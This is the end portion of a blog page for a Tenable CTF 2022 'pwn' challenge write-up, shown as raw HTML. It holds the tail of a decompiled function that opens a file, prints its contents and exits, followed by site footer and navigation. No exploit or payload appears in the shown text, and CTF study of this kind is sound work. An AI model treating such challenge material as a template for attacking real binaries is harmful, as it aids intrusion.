    <span style=color:#66d9ef>if</span> (local_18 <span style=color:#f92672>!=</span> (FILE <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>)
    {
        <span style=color:#66d9ef>while</span> (local_9 <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
        {
            putchar((<span style=color:#66d9ef>int</span>)local_9);
            iVar1 <span style=color:#f92672>=</span> fgetc(local_18);
            local_9 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span>)iVar1;
        }
        fclose(local_18);
    }
    <span style=color:#75715e>/* WARNING: Subroutine does not return */</span>
    exit(<span style=color:#ae81ff>0</span>);
}
</code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div class=book-languages tabindex=0 aria-haspopup=true><ul><li class="flex align-center"><img src=https://www.kaytaka.com/svg/translate.svg class=book-icon alt=Languages>
English</li></ul><ul class=book-languages-list><li class=active><a href=https://www.kaytaka.com/ class="flex align-center"><img src=https://www.kaytaka.com/svg/translate.svg class=book-icon alt=Languages>
English</a></li><li><a href=https://www.kaytaka.com/ru/ class="flex align-center"><img src=https://www.kaytaka.com/svg/translate.svg class=book-icon alt=Languages>
Russian</a></li><li><a href=https://www.kaytaka.com/zh/ class="flex align-center"><img src=https://www.kaytaka.com/svg/translate.svg class=book-icon alt=Languages>
Chinese</a></li></ul></div><div><a class="flex align-center" href=https://github.com/alex-shpak/hugo-book/commit/69430a955e763cc28ca80615f5d6fb58b6cdb016 title="Last modified by takashimakazuki | June 28, 2022" target=_blank rel=noopener><img src=https://www.kaytaka.com/svg/calendar.svg class=book-icon alt=Calendar>
<span>June 28, 2022</span></a></div><div><a class="flex align-center" href=https://github.com/alex-shpak/hugo-book/edit/main/exampleSite/content/posts/tenable-pwnable.md target=_blank rel=noopener><img src=https://www.kaytaka.com/svg/edit.svg class=book-icon alt=Edit>
<span>Edit this page</span></a></div></div><script>(function(){function a(c){const a=window.getSelection(),b=document.createRange();b.selectNodeContents(c),a.removeAllRanges(),a.addRange(b)}document.querySelectorAll("pre code").forEach(b=>{b.addEventListener("click",function(c){a(b.parentElement),navigator.clipboard&&navigator.clipboard.writeText(b.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#tenable-ctf-2022-writeup-olden-ringpwn>Tenable CTF 2022 Writeup &lsquo;Olden Ring&rsquo;[pwn]</a><ul><li><a href=#問題>問題</a></li><li><a href=#解説>解説</a></li><li><a href=#所感>所感</a></li><li><a href=#配布されたバイナリのデコンパイル結果>配布されたバイナリのデコンパイル結果</a></li></ul></li></ul></nav></div></aside></main></body></html>